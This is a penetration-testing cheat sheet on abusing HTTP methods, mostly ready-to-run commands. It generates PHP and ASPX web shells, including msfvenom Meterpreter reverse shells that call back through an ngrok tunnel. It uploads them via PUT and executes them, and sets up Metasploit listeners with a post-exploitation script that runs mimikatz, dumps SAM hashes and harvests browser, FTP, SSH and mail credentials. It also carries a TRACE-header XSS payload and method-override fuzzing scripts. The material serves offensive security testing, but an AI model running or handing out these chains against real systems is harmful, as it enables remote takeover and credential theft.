# HTTP Methods

## Check List

* [ ] Enumerate supported HTTP methods.
* [ ] Test for access control bypass.
* [ ] Test XST vulnerabilities.
* [ ] Test HTTP method overriding techniques.

## Cheat Sheet

### Methdology

#### HTTP Methods&#x20;

{% stepper %}
{% step %}
We run the following command to identify the active methods on the target using the Curl tool
{% endstep %}

{% step %}
We can do this by using the Nmap tool to identify the active methods on the target
{% endstep %}

{% step %}
We can do this by using the Nmap tool to identify the active methods on the target. After executing the command, if the PUT method is active on the target, using the next command, we try to upload a php file to the target to get RCE
{% endstep %}

{% step %}
If our file is uploaded to the specified path using the PUT method, the site is vulnerable
{% endstep %}
{% endstepper %}

***

#### XSS in Trace Method (Black Box)

{% stepper %}
{% step %}
first Check if the Server Supports TRACE Send a simple TRACE request to check if the server responds
{% endstep %}

{% step %}
If the server supports the Trace method, the next step is to inject JavaScript code
{% endstep %}

{% step %}
Modify the request by injecting an XSS payload inside the `Via` header If the server reflects this payload in its response without sanitization, it may be vulnerable to XSS
{% endstep %}

{% step %}
{% hint style="info" %}
If a web application connected to this server processes and displays the reflected data inside an HTML page, the script may execute in a victim's browser
{% endhint %}
{% endstep %}
{% endstepper %}

***

### Discover the Supported Methods <a href="#discover-the-supported-methods" id="discover-the-supported-methods"></a>

#### [cURL](https://curl.se/)

{% hint style="info" %}
Check Methods
{% endhint %}

```bash
curl -X OPTIONS -I $WEBSITE
```

{% hint style="info" %}
Upload phpinfo()
{% endhint %}

```bash
curl -X PUT -d "<?php phpinfo(); ?>" $WEBSITE/phpinfo.php
```

#### [Nmap](https://nmap.org/)

```bash
nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
```

### **PUT Method**

#### [Weevely](https://github.com/epinna/weevely3)

{% hint style="info" %}
Create Web Shell PHP
{% endhint %}

```bash
weevely generate 00980098 /tmp/unk9vvn.php
```

{% hint style="info" %}
Create Web Shell ASPX
{% endhint %}

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
```

#### [cURL](https://curl.se/)

{% hint style="info" %}
Upload Web Shell PHP
{% endhint %}

<pre class="language-bash"><code class="lang-bash">curl -X PUT $WEBSITE/uploads/index.php \
<strong>     --upload-file /tmp/unk9vvn.php \
</strong>     -H "Content-Type: application/x-php"
</code></pre>

{% hint style="info" %}
Execute Web Shell PHP
{% endhint %}

```bash
weevely "$WEBSITE/uploads/index.php" 00980098
```

{% hint style="info" %}
Upload Web Shell ASP
{% endhint %}

```bash
curl -X PUT $WEBSITE/uploads/index.aspx \
     --upload-file /tmp/unk9vvn.aspx \
     -H "Content-Type: application/x-aspx"
```

{% hint style="info" %}
Execute Web Shell ASP
{% endhint %}

```bash
curl "$WEBSITE/uploads/index.aspx?cmd=whoami"
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
All Methods Scan
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/options;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    run -j"
```

{% hint style="info" %}
PUT Method Scan
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/http_put;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set PATH /uploads;
    run -j"
```

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
nohup ngrok tcp 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

{% hint style="info" %}
Cert Spoof
{% endhint %}

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

{% hint style="info" %}
Post-EXP
{% endhint %}

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

{% hint style="info" %}
Generate Web shell PHP
{% endhint %}

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 -i 3 \
         -o /tmp/unk9vvn.php
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

{% hint style="info" %}
Generate Web Shell ASP
{% endhint %}

```bash
msfvenom -p windows/meterpreter/reverse_winhttps \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f asp > /tmp/unk9vvn.aspx
```

{% hint style="info" %}
Listening Metasploit PHP
{% endhint %}

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Listening Metaploit ASP
{% endhint %}

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD windows/meterpreter/reverse_winhttps;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Upload Shell PUT Method PHP
{% endhint %}

```bash
curl -X PUT $WEBSITE/wp-content/uploads/index.php \
--upload-file /tmp/unk9vvn.php \
-H "Content-Type: application/x-php"
```

### Access Control Bypass <a href="#testing-for-access-control-bypass" id="testing-for-access-control-bypass"></a>

#### [Katana](https://github.com/projectdiscovery/katana) & [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano http-methods-fuzzer.sh
```

<pre class="language-bash"><code class="lang-bash">#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 &#x3C;WEBSITE>"
    exit 1
fi

WEBSITE="$1"

# Validate URL format
if ! [[ "$WEBSITE" =~ ^https?:// ]]; then
    echo "Error: WEBSITE must start with http:// or https://"
    exit 1
fi

# Create temporary files
KATANA_OUTPUT=$(mktemp)
URLS_FILE=$(mktemp)
COOKIE_FILE=$(mktemp)

# Cleanup function
cleanup()
{
    rm -f "$KATANA_OUTPUT" "$URLS_FILE" "$COOKIE_FILE"
}
trap cleanup EXIT

# Run katana to gather URLs
katana -u $WEBSITE \
       -fr "(static|assets|img|images|css|fonts|icons)/" \
       -o "$KATANA_OUTPUT" \
       -xhr-extraction \
       -automatic-form-fill \
       -silent \
       -strategy breadth-first \
       -js-crawl \
       -extension-filter jpg,jpeg,png,gif,bmp,tiff,tif,webp,svg,ico,css \
       -headless --no-sandbox \
       -known-files all \
       -field url \
       -sf url

# Filter and clean extracted URLs
sed -E 's/\?.*//; s/\.aspx$//; s/\/[^/]+\.json$//' "$KATANA_OUTPUT" | grep -Ev '\.js$|&#x26;amp' | sort -u > "$URLS_FILE"

# User-Agent and headers
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"
HEADERS=(
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Accept-Language: en-US,fa-IR;q=0.5"
    "Accept-Encoding: gzip, deflate, br, zstd"
    "Connection: keep-alive"
    "Upgrade-Insecure-Requests: 1"
    "Sec-Fetch-Dest: script"
    "Sec-Fetch-Mode: no-cors"
    "Sec-Fetch-Site: cross-site"
    "DNT: 1"
    "Sec-GPC: 1"
    "Priority: u=0, i"
    "Te: trailers"
)

# Extract cookies
COOKIES=$(curl -s -I "$WEBSITE" | awk 'BEGIN {IGNORECASE=1} /^set-cookie:/ {print substr($0, 13)}' | awk -F';' '{print $1}' | tr '\n' '; ' | sed 's/; $//')

# Append cookies if available
if [[ -n "$COOKIES" ]]; then
    HEADERS+=("Cookie: $COOKIES")
fi

# Convert headers into ffuf parameters
HEADER_PARAMS=()
for HEADER in "${HEADERS[@]}"; do
    HEADER_PARAMS+=("-H" "$HEADER")
done

# Run ffuf
<strong>echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt
</strong>ffuf -w "$URLS_FILE":URL \
     -w /tmp/methods.txt:METHODS \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -r -c -mc 200 \
     "${HEADER_PARAMS[@]}"
</code></pre>

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x http-methods-fuzzer.sh;sudo ./http-methods-fuzzer.sh $WEBSITE
```

### Cross-Site Tracing Potential <a href="#testing-for-cross-site-tracing-potential" id="testing-for-cross-site-tracing-potential"></a>

#### [FFUF](https://github.com/ffuf/ffuf)

```bash
ffuf -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X TRACE \
     -H "Custom-Test-Header: <scipt>alert('unk9vvn')</script>" \
     -r -c -mc 200 -mr "unk9vvn"
```

### HTTP Method Overriding <a href="#testing-for-http-method-overriding" id="testing-for-http-method-overriding"></a>

#### [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
X-HTTP-Method
{% endhint %}

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-HTTP-Method: METHODS" \
     -r -c -mc 200
```

{% hint style="info" %}
X-HTTP-Method-Override
{% endhint %}

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-HTTP-Method-Override: METHODS" \
     -r -c -mc 200
```

{% hint style="info" %}
X-Method-Override
{% endhint %}

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-Method-Override: METHODS" \
     -r -c -mc 200
```
